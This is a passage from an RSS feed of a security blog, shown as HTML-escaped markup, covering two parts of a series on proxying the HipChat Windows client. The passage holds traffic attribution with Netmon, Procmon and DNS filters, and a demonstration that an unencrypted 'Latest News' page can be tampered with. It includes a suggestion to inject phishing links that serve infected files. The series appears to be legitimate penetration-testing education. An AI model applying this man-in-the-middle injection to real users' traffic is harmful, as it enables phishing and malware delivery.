&lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;rss&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;version=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns:sparkle=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;http://www.andymatuschak.org/xml-namespaces/sparkle&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns:dc=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;http://purl.org/dc/elements/1.1/&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;xmlns:hipchat=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;http://hipchat.com&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;channel&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;HipChat Windows App Changelog&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;link&amp;gt;&lt;/span&gt;https://www.hipchat.com/release_notes/appcast/qtwindows&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/link&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;Appcast of updates.&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;language&amp;gt;&lt;/span&gt;en&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/language&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;item&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Version 2.2.1388 (1388)&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;pubDate&amp;gt;&lt;/span&gt;Tue, 23 Jun 2015 00:00:00 +0000&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/pubDate&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;sparkle:releaseNotesLink&amp;gt;&lt;/span&gt;https://www.hipchat.com/release_notes/client_embed/qtwindows?version_num=1373&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;amp;&lt;/span&gt;auth-token=JHAgpsxHVva3SMC&lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;amp;&lt;/span&gt;auth-uid=351&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/sparkle:releaseNotesLink&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;sparkle:minimumSystemVersion&amp;gt;&lt;/span&gt;10.8&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/sparkle:minimumSystemVersion&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;enclosure&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;url=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;https://s3.amazonaws.com/downloads.hipchat.com/windows/HipChat-2.2.1388-win32.msi&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;sparkle:version=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;1388&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;sparkle:shortVersionString=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;2.2.1388&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;length=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;43982848&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;application/octet-stream&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;hipchat:required&amp;gt;&lt;/span&gt;0&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/hipchat:required&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/item&amp;gt;&lt;/span&gt;
...

&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/channel&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #268BD2&#34;&gt;&amp;lt;/rss&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I think this RSS feed is used to check for updates.&lt;/p&gt;

&lt;h3 id=&#34;5-get-request-over-http:4e05e28f6fdfa8cb6420fb7940d5416d&#34;&gt;5. GET request over HTTP&lt;/h3&gt;

&lt;p&gt;Now let’s take a look at request one. It is loading an HTML page and displays it in the app. directly We can intercept the response in Burp and modify it. The request is to &lt;a href=&#34;http://downloads.hipchat.com/blog_info.html&#34; target=&#34;_blank&#34;&gt;http://downloads.hipchat.com/blog_info.html&lt;/a&gt; and that page is not available over TLS.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/10-Changing-latest-news.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;That was easy. Now let’s see if we can modify it to display something else.&lt;/p&gt;

&lt;p&gt;Seems like it does not have JavaScript enabled so we cannot do a fancy looking alert box. We can inject buttons and forms but the submit action does not work. We can also inject images.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat2/11-image-tag.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;This is not a serious vulnerability. The attacker needs to be on the same network or in the path and MitM the HTTP connection. But because it is HTTP, there are no certificate warnings. A number of Internet Service Providers also inject ads and other stuff in HTTP traffic. If injected they will appear here. I still do not know why even the emoticon is loaded over https but this latest news is not (&lt;code&gt;downloads.hipchat.com&lt;/code&gt; is not even available over HTTPs).&lt;/p&gt;

&lt;p&gt;In my opinion the best strategy for an attacker is to inject links to phishing sites. Something along the lines of &lt;code&gt;Click to download the new version&lt;/code&gt; and serve infected files or &lt;code&gt;Click to verify your account&lt;/code&gt; and point to a phishing login screen. Doubly so because this is &lt;em&gt;the Hipchat link box&lt;/em&gt; and users are expected to click these links. We should also remember that Hipchat is also used in non-corporate environments so the next person at Starbucks may be messing with your traffic.&lt;/p&gt;

&lt;h4 id=&#34;5-1-the-container:4e05e28f6fdfa8cb6420fb7940d5416d&#34;&gt;5.1 The Container&lt;/h4&gt;

&lt;p&gt;The container looks like to be QtWebKit (remember the User-Agent?). It does not have JavaScript enabled so injected JS will not be executed. We can inject forms, but the actions will not work (e.g. I injected a simple form with one input field to pass its contents to do a Google search but nothing happens when the button is clicked). This part needs more investigation and I will probably get back to it. If you know about this container (whatever that is) please let me know.&lt;/p&gt;

&lt;p&gt;In part three, we will talk about proxying Hipchat client’s traffic with the Hipchat server that we skipped using Burp&amp;rsquo;s SSL Pass Through and do more exciting stuff.&lt;/p&gt;

&lt;p&gt;As usual if you have any questions/feedback/complaints or just want life advice from ancient Persian spirits, you know where to find me.&lt;/p&gt;

&lt;!--links--&gt;
</description>
    </item>
    
    <item>
      <title>Proxying Hipchat Part 1: Where did the Traffic Go?</title>
      <link>http://parsiya.net/blog/2015-10-08-Proxying-Hipchat-Part-1-Where-did-the-Traffic-Go/</link>
      <pubDate>Thu, 08 Oct 2015 23:05:24 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2015-10-08-Proxying-Hipchat-Part-1-Where-did-the-Traffic-Go/</guid>
      <description>

&lt;p&gt;This is a slightly different version of a series of blog post that I wrote on our internal blog about proxying. I see that proxying traffic is a time consuming step in testing thick client applications so I thought I would share what I know. I tackled Hipchat. Why Hipchat? Because it uses a known protocol (XMPP) and I thought it&amp;rsquo;s an interesting application.&lt;/p&gt;

&lt;p&gt;I used Hipchat Windows client version 2. At the time of writing version 4 is in beta. In this part we will see how we can identify endpoints from traffic captures even when they are behind a load balancer/shared hosting etc. In next parts we will start proxying.&lt;/p&gt;

&lt;h3 id=&#34;0-setup-and-tools:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;0. Setup and Tools&lt;/h3&gt;

&lt;p&gt;I will be using the following tools in this part:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Microsoft Network Monitor (Netmon). You can also use Wireshark.&lt;/li&gt;
&lt;li&gt;Powershell/Command Prompt/etc: I am using Windows but I am sure you can find the equivalent commands if you are fancy ;)&lt;/li&gt;
&lt;li&gt;Procmon&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;You can deploy your own Hipchat server by &lt;a href=&#34;https://www.hipchat.com/server/get-it&#34; target=&#34;_blank&#34;&gt;downloading a VM&lt;/a&gt;. You will need a license (or an evaluation version) or you can buy a 10 license server for &lt;a href=&#34;https://www.atlassian.com/purchase/product/com.atlassian.hipchat.server&#34; target=&#34;_blank&#34;&gt;10 bucks&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Note: In these posts, the Hipchat server is named &lt;code&gt;hipchatserver.com&lt;/code&gt; and its IP is &lt;code&gt;10.10.10.10&lt;/code&gt; (these are just examples). Some of the screenshots are edited to hide the actual IPs and replace them with samples. My machine&amp;rsquo;s sample IP address for the network interface that hosts the Hipchat server is &lt;code&gt;10.10.10.9&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;1-traffic-attribution:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;1. Traffic Attribution&lt;/h3&gt;

&lt;p&gt;Run Netmon and Procmon as admin and run HipChat. We already know how to do &lt;a href=&#34;http://parsiya.net/blog/2015-08-01-Network-Traffic-Attribution-on-Windows/&#34; title=&#34;Network Traffic Attribution on Windows&#34; target=&#34;_blank&#34;&gt;traffic attribution&lt;/a&gt;. I was not logged into any chatrooms, so Hipchat is not loading any extra content (e.g. images linked in rooms).&lt;/p&gt;

&lt;p&gt;In Netmon we also see the following endpoints:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;10.10.10.10&lt;/li&gt;
&lt;li&gt;54.231.81.2&lt;/li&gt;
&lt;li&gt;54.231.96.96&lt;/li&gt;
&lt;li&gt;54.231.47.194&lt;/li&gt;
&lt;li&gt;54.225.209.74&lt;/li&gt;
&lt;/ol&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat1/01-Traffic-in-Netmon.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Traffic in Netmon, click to view full-size image.&lt;/p&gt;

&lt;p&gt;You will notice that I have a slightly different layout in Netmon now. I have removed time related columns. Right click any column name and select &lt;code&gt;Choose Columns&lt;/code&gt;. There are also different layouts like &lt;code&gt;HTTP Troubleshoot&lt;/code&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat1/02-Endpoints-in-Netmon.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;In Procmon we can see five endpoints:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;hipchatserver.com:5222&lt;/li&gt;
&lt;li&gt;s3-website-us-east-1.amazonaws.com:http&lt;/li&gt;
&lt;li&gt;s3-1.amazonaws.com:https&lt;/li&gt;
&lt;li&gt;ec2-54-531-47-194.compute-1.amazonaws.com:https&lt;/li&gt;
&lt;li&gt;ec2-54-225-209-74.compute-1.amazonaws.com:https&lt;/li&gt;
&lt;/ol&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat1/03-Endpoints-in-Procmon.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;Procmon filters are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ProcessName is Hipchat.exe&lt;/li&gt;
&lt;li&gt;Operation is TCP Connect&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;2-where-does-the-traffic-go:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;2. Where does the traffic go?&lt;/h3&gt;

&lt;p&gt;Now we need to find out more about these endpoints (e.g. their actual address/URL etc). Based on their temporal sequence in Procmon and Netmon we have some insights.&lt;/p&gt;

&lt;h4 id=&#34;2-1-10-10-10-10-hipchatserver-com:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;2.1 – 10.10.10.10 – hipchatserver.com&lt;/h4&gt;

&lt;p&gt;This is easy. It’s the Hipchat server at &lt;code&gt;hipchatserver.com&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;PS C:\&amp;gt; nslookup 10.10.10.10
Server:  zzzz.com
Address:  10.10.10.2

Name:    hipchatserver.com
Address:  10.10.10.10

PS C:\&amp;gt; ping -a 10.10.10.10
Pinging hipchatserver.com [10.10.10.10] with 32 bytes of data:
...
&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&#34;2-2-54-231-81-2-s3-website-us-east-1-amazonaws-com:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;2.2 – 54.231.81.2 – s3-website-us-east-1.amazonaws.com&lt;/h4&gt;

&lt;p&gt;This is where things start to become interesting. Let’s re-use our old tricks.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;PS C:\&amp;gt; nslookup 54.231.81.2
Server:  zzzz.com
Address:  10.10.10.2

Name:    s3-website-us-east-1.amazonaws.com
Address:  54.231.81.2

PS C:\&amp;gt; ping -a 54.231.81.2
Pinging s3-website-us-east-1.amazonaws.com [54.231.81.2] with 32 bytes of data:
...
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It seems like the second endpoint is hosted on an AWS S3 bucket. S3 buckets are mainly storage containers but they can also host static websites like this website. But we won&amp;rsquo;t find anything if we go to that address. &lt;code&gt;s3-website-us-east-1.amazonaws.com&lt;/code&gt; is the east coast AWS data center which is located in Northern Virginia. You will get a different endpoint based on where you are located.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s look at the conversation in Netmon. This is similar to &lt;code&gt;Follow TCP/UDP Stream&lt;/code&gt; in Wireshark but unfortunately not as good.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat1/04-bloginfo-fetch.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;We are in luck, we can see a &lt;code&gt;GET&lt;/code&gt; request over HTTP. Let’s look at it’s payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;GET&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;/blog_info.html&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1.1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;User-Agent&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) HipChat/2.2.1388 Safari/538.1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Connection&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Keep-Alive&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;gzip, deflate&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Accept-Language&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;en-US,*&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;downloads.hipchat.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Note the User-Agent. Hipchat is fetching &lt;a href=&#34;http://downloads.hipchat.com/blog_info.html&#34; target=&#34;_blank&#34;&gt;http://downloads.hipchat.com/blog_info.html&lt;/a&gt;. This is the &lt;code&gt;Latest News&lt;/code&gt; at the bottom of the Hipchat client. Notice that it is being loaded over HTTP and surprisingly it is not available over TLS (try accessing &lt;a href=&#34;https://downloads.hipchat.com/blog_info.html&#34; target=&#34;_blank&#34;&gt;https://downloads.hipchat.com/blog_info.html&lt;/a&gt;) does not work. In fact you cannot access &lt;a href=&#34;https://downloads.hipchat.com/&#34; target=&#34;_blank&#34;&gt;https://downloads.hipchat.com&lt;/a&gt;.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat1/05-Latest-news-in-hipchat.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;h5 id=&#34;2-2-1-but-what-if-this-request-was-over-tls:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;2.2.1 But what if this request was over TLS?&lt;/h5&gt;

&lt;p&gt;Then we would have seen the TLS handshake and then encrypted data. Even by looking at the Common Name (CN) field in server’s certificate in 2nd part of the TLS handshake (&lt;code&gt;Server Hello&lt;/code&gt;) we wouldn&amp;rsquo;t have been able to discover the endpoint.
Traffic in Netmon, click to view full-size image.
We are going to have to look at DNS requests. We know the endpoint’s IP address so we will try to find the DNS request that had this IP in its answer. The endpoint’s IP address is &lt;code&gt;54.231.81.2&lt;/code&gt; which is &lt;code&gt;36E75102&lt;/code&gt; in Hex. In Netmon, select &lt;code&gt;All Traffic&lt;/code&gt; (In Netmon DNS traffic is not included in process traffic) and enter the following filter:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;  DNS &amp;amp;&amp;amp; ContainsBin(FrameData, HEX, &amp;quot;36E75102&amp;quot;)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This filter searches for the IP address in DNS traffic. It will find the DNS query that returned this IP address.&lt;/p&gt;









&lt;span class=&#34;caption-wrapper&#34;&gt;
  &lt;img class=&#34;caption&#34; src=&#34;http://parsiya.net/images/2015/hipchat1/06-Downloads.png&#34; title=&#34;&#34; alt=&#34;&#34;&gt;
  &lt;span class=&#34;caption-text&#34;&gt;&lt;/span&gt;
&lt;/span&gt;

&lt;p&gt;As we can see, it is &lt;code&gt;downloads.hipchat.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;IP to Hex conversion can be done online, by hand or using Python:&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;IP to Hex&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;PS&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;C:&lt;/span&gt;\&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;python&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;binascii&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;inet_aton(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;54.231.81.2&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;36e75102&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h4 id=&#34;2-3-54-231-96-96-s3-1-amazonaws-com:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;2.3 – 54.231.96.96 – s3-1.amazonaws.com&lt;/h4&gt;

&lt;p&gt;Same trick. &lt;code&gt;54.231.96.96&lt;/code&gt; in Hex is &lt;code&gt;36E76060&lt;/code&gt; so filter is:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;  DNS &amp;amp;&amp;amp; ContainsBin(FrameData, HEX, &amp;quot;36E76060&amp;quot;)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;which points to &lt;code&gt;s3.amazonaws.com&lt;/code&gt;. As we will see in part two, this is the request to load the emoticon shown with latest news, in this case it is the &lt;code&gt;success kid&lt;/code&gt; image macro.&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;- Dns: QueryId = 0xC28D, QUERY (Standard query), Response - Success, 53, 0 ... 
    QueryIdentifier: 49805 (0xC28D)
  + Flags:  Response, Opcode - QUERY (Standard query), RD, RA, Rcode - Success
    QuestionCount: 1 (0x1)
    AnswerCount: 3 (0x3)
    NameServerCount: 0 (0x0)
    AdditionalCount: 0 (0x0)
  - QRecord: s3.amazonaws.com of type Host Addr on class Internet  PS C:\&amp;gt; python
     QuestionName: s3.amazonaws.com
     QuestionType: A, IPv4 address, 1(0x1)
     QuestionClass: Internet, 1(0x1)
  - ARecord: s3.amazonaws.com of type CNAME on class Internet: s3.a-geo.amazonaws.com
     ResourceName: s3.amazonaws.com
     ResourceType: CNAME, Canonical name for an alias, 5(0x5)
     ResourceClass: Internet, 1(0x1)
     TimeToLive: 2554 (0x9FA)
     ResourceDataLength: 11 (0xB)
     CName: s3.a-geo.amazonaws.com
  - ARecord: s3.a-geo.amazonaws.com of type CNAME on class Internet: s3-1.amazonaws.com
     ResourceName: s3.a-geo.amazonaws.com
     ResourceType: CNAME, Canonical name for an alias, 5(0x5)
     ResourceClass: Internet, 1(0x1)
     TimeToLive: 1555 (0x613)
     ResourceDataLength: 7 (0x7)
     CName: s3-1.amazonaws.com
  - ARecord: s3-1.amazonaws.com of type Host Addr on class Internet: 54.231.96.96
     ResourceName: s3-1.amazonaws.com
     ResourceType: A, IPv4 address, 1(0x1)
     ResourceClass: Internet, 1(0x1)
     TimeToLive: 4 (0x4)
     ResourceDataLength: 4 (0x4)
     IPAddress: 54.231.96.96
&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&#34;2-4-54-243-47-194-ec2-54-243-47-194-compute-1-amazonaws-com:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;2.4 – 54.243.47.194 – ec2-54-243-47-194.compute-1.amazonaws.com&lt;/h4&gt;

&lt;p&gt;This is easy, we can just go to &lt;a href=&#34;http://ec2-54-243-47-194.compute-1.amazonaws.com&#34; target=&#34;_blank&#34;&gt;http://ec2-54-243-47-194.compute-1.amazonaws.com&lt;/a&gt; and observe that it is &lt;a href=&#34;http://www.hipchat.com&#34; target=&#34;_blank&#34;&gt;http://www.hipchat.com&lt;/a&gt;. Interesting thing, if you go to &lt;a href=&#34;http://www.hipchat.com&#34; target=&#34;_blank&#34;&gt;http://www.hipchat.com&lt;/a&gt; in your browser, it will redirect to the HTTPs version of the website. Going to the Amazon EC2 address is the only way to access hipchat.com over HTTP.&lt;/p&gt;

&lt;p&gt;We can also use this filter in Netmon:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;  DNS &amp;amp;&amp;amp; ContainsBin(FrameData, HEX, &amp;quot;36F32FC2&amp;quot;)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Which results in:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;- Dns: QueryId = 0x1D07, QUERY (Standard query), Response - Success, 54.243.47.194 
    QueryIdentifier: 7431 (0x1D07)
  + Flags:  Response, Opcode - QUERY (Standard query), RD, RA, Rcode - Success
    QuestionCount: 1 (0x1)
    AnswerCount: 1 (0x1)
    NameServerCount: 0 (0x0)
    AdditionalCount: 0 (0x0)
  - QRecord: www.hipchat.com of type Host Addr on class Internet
     QuestionName: www.hipchat.com
     QuestionType: A, IPv4 address, 1(0x1)
     QuestionClass: Internet, 1(0x1)
  - ARecord: www.hipchat.com of type Host Addr on class Internet: 54.243.47.194
     ResourceName: www.hipchat.com
     ResourceType: A, IPv4 address, 1(0x1)
     ResourceClass: Internet, 1(0x1)
     TimeToLive: 60 (0x3C)
     ResourceDataLength: 4 (0x4)
     IPAddress: 54.243.47.194
&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&#34;2-5-54-225-209-74-ec2-54-225-209-74-compute-1-amazonaws-com:45cd71e0a7c5e93aaf85b0f4020cc96b&#34;&gt;2.5 – 54.225.209.74 – ec2-54-225-209-74.compute-1.amazonaws.com&lt;/h4&gt;

&lt;p&gt;This is the same as above with one small difference. Using this filter:&lt;/p&gt;
&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;DNS &amp;amp;&amp;amp; ContainsBin(FrameData, HEX, &amp;quot;36E1D14A&amp;quot;)
&lt;/pre&gt;&lt;/div&gt;

